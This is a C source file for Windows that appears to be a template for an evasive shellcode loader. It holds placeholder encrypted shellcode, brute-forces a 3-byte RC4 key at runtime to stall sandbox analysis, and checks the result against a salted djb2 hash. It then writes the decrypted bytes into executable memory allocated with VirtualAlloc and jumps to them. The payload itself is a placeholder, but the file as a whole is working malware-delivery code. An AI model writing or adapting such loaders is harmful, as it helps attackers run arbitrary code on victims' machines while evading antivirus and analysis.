#include <windows.h>

// Encrypted shellcode
unsigned char encrypted_shellcode[] = "ENCRYPTED_SHELLCODE_PLACEHOLDER";
unsigned char expected_hash[] = "EXPECTED_HASH_PLACEHOLDER";
unsigned char salt[] = "SALT_PLACEHOLDER";

// RC4 state structure
typedef struct {
    unsigned char S[256];
    unsigned char i;
    unsigned char j;
} rc4_state_t;

// RC4 initialization (KSA)
void rc4_init(rc4_state_t *st, const unsigned char *key, int keylen) {
    int i, j = 0;
    unsigned char tmp;
    
    for (i = 0; i < 256; i++) st->S[i] = (unsigned char)i;
    st->i = 0;
    st->j = 0;
    
    for (i = 0; i < 256; i++) {
        j = (j + st->S[i] + key[i % keylen]) % 256;
        tmp = st->S[i];
        st->S[i] = st->S[j];
        st->S[j] = tmp;
    }
    st->i = 0;
    st->j = 0;
}

// RC4 decryption (PRGA)
void rc4_decrypt(rc4_state_t *st, unsigned char *data, int len) {
    int k;
    unsigned char tmp, K;
    
    for (k = 0; k < len; k++) {
        st->i = (st->i + 1) % 256;
        st->j = (st->j + st->S[st->i]) % 256;
        tmp = st->S[st->i];
        st->S[st->i] = st->S[st->j];
        st->S[st->j] = tmp;
        K = st->S[(st->S[st->i] + st->S[st->j]) % 256];
        data[k] ^= K;
    }
}

// djb2 hash for validation
unsigned int djb2_hash(const unsigned char *data, int len) {
    unsigned int hash = 5381;
    int i;
    
    for (i = 0; i < len; i++) {
        hash = ((hash * 33) + data[i]) & 0xFFFFFFFF;
    }
    return hash;
}

// Convert 4 bytes to uint (little-endian)
unsigned int bytes_to_uint(const unsigned char *bytes) {
    return (unsigned int)bytes[0] | 
           ((unsigned int)bytes[1] << 8) | 
           ((unsigned int)bytes[2] << 16) | 
           ((unsigned int)bytes[3] << 24);
}

// Recursive bruteforce to find RC4 key
int bruteforce_key(unsigned char *key, int pos, int max_len, int shellcode_len, unsigned char *decrypted_buffer) {
    int i;
    rc4_state_t rc4_state;
    unsigned int calculated_hash;
    unsigned int target_hash = bytes_to_uint(expected_hash);
    
    // If we've built a complete key, test it
    if (pos == max_len) {
        // Copy encrypted shellcode to decrypt buffer
        memcpy(decrypted_buffer, encrypted_shellcode, shellcode_len);
        
        // Initialize RC4 with current key and decrypt
        rc4_init(&rc4_state, key, max_len);
        rc4_decrypt(&rc4_state, decrypted_buffer, shellcode_len);
        
        // Create buffer for shellcode + salt for hash validation
        unsigned char hash_input[4096 + 64];
        memcpy(hash_input, decrypted_buffer, shellcode_len);
        int salt_len = sizeof(salt) - 1; // -1 for null terminator
        memcpy(hash_input + shellcode_len, salt, salt_len);
        
        // Calculate hash and validate
        calculated_hash = djb2_hash(hash_input, shellcode_len + salt_len);
        
        if (calculated_hash == target_hash) {
            return 1; // Key found!
        }
        return 0;
    }
    
    // Try all possible byte values (1-255, avoiding null bytes)
    for (i = 1; i <= 255; i++) {
        key[pos] = (unsigned char)i;
        if (bruteforce_key(key, pos + 1, max_len, shellcode_len, decrypted_buffer)) {
            return 1;
        }
    }
    
    return 0;
}

int main() {
    unsigned char key[3];
    unsigned char decrypted_shellcode[4096];
    int shellcode_len = sizeof(encrypted_shellcode) - 1;
    int found = 0;
    
    // Bruteforce RC4 key of 3 bytes
    memset(key, 0, sizeof(key));
    if (bruteforce_key(key, 0, 3, shellcode_len, decrypted_shellcode)) {
        found = 1;
    }
    
    if (found) {
        // Key found, inject and execute decrypted shellcode
        void *execs = VirtualAlloc(0, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (execs) {
            memcpy(execs, decrypted_shellcode, shellcode_len);
            ((void(*)())(execs))();
        }
    }

    return 0;
}